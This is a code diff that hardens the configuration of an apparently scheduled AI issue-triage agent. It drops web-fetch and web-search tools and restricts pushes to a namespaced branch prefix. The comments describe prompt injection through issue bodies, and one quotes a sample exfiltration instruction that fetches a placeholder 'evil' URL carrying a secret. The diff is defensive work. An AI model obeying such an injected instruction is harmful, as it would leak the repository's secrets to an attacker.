@@ -47,9 +47,25 @@ def _build(prompt: str, *, cron: str, repo: str, prefix: str, display: str, auto
                     },
                 }],
                 "session_context": {
-                    "allowed_tools": ["Bash", "Read", "Write", "Edit", "Glob", "Grep", "WebFetch", "WebSearch"],
+                    # Tier-1 (build-time enforced) least-privilege tool allowlist. A
+                    # prompt-injected issue body cannot widen this set. WebFetch/WebSearch
+                    # are deliberately excluded: issue triage never needs them, and they are
+                    # the cleanest exfiltration channel for an injected instruction
+                    # ("fetch https://evil/?d=<secret>"). Bash remains because gh/git/tests
+                    # require it — see SECURITY.md for the residual-risk discussion.
+                    "allowed_tools": ["Bash", "Read", "Write", "Edit", "Glob", "Grep"],
                     "autofix_on_pr_create": autofix,
-                    "outcomes": [{"git_repository": {"git_info": {"branches": [f"claude/{prefix}-routine"], "repo": repo}}}],
+                    # Branch-scope containment. Every branch this routine may push is
+                    # namespaced under `claude/<prefix>-*`, so a compromised run cannot
+                    # push to the base branch or to another routine's branches. The
+                    # prompts are instructed to name branches `claude/<prefix>-issue-N-*`
+                    # so real behavior stays inside this allowlist.
+                    # ASSUMPTION (verify against `RemoteTrigger action=list` for your
+                    # environment): the platform treats `branches` as a prefix/glob
+                    # allowlist. If it requires exact names, this still must change —
+                    # the old `claude/{prefix}-routine` never matched the per-issue
+                    # branches the prompts create, so the allowlist was inert.
+                    "outcomes": [{"git_repository": {"git_info": {"branches": [f"claude/{prefix}-*"], "repo": repo}}}],
                     "sources": [{"git_repository": {"url": f"https://github.com/{repo}"}}],
                 },
             },
